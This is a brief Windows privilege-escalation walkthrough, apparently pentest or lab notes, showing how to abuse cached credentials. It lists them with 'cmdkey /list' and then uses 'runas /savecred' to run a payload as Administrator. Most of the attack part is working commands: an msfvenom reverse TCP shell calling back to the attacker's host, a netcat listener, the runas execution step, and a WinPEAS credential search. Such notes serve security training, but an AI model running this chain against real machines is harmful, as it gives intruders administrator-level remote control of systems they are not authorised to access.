Runas is a Windows command-line tool that allows a user to run specific tools, programs or commands with different permissions than the user’s current logon provides.

If a user’s credentials are cached in the system, the Runas command can be run using the /savecred flag which will automatically authenticate and execute the command as that user.


Identifying Stored Credentials

Cmdkey is a Windows command-line utility that is used to create, list, and delete stored user names and passwords or credentials.

The following command can be used to identify stored credentials:

```
cmdkey /list
```

![Screenshot from 2024-09-30 02-29-29](https://github.com/user-attachments/assets/a0405e65-29ba-4208-832a-b6979ee52133)

**Exploit**

1. A reverse shell should be crafted:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<our ip> LPORT=1234 -f exe > shell.exe
```

2. Transferring the ```shell.exe``` file to the Windows victim machine using the Python web server
3. The next step is to set up a Netcat listener:
```
nc -nlvp 1234
```
 4.The following command can then be used to execute the reverse shell as the Administrator user:
```
runas /savecred /user:msedgewin10\Administrator "C:\Users\lol\shell.exe"
```
The Runas command executed the reverse shell as the administrator user, therefore granting remote SYSTEM level access to the machine.

**Automated scripts such as WinPEAS can also find stored credentials:**
--
```
winpeas.exe quiet cmd windowscreds
```
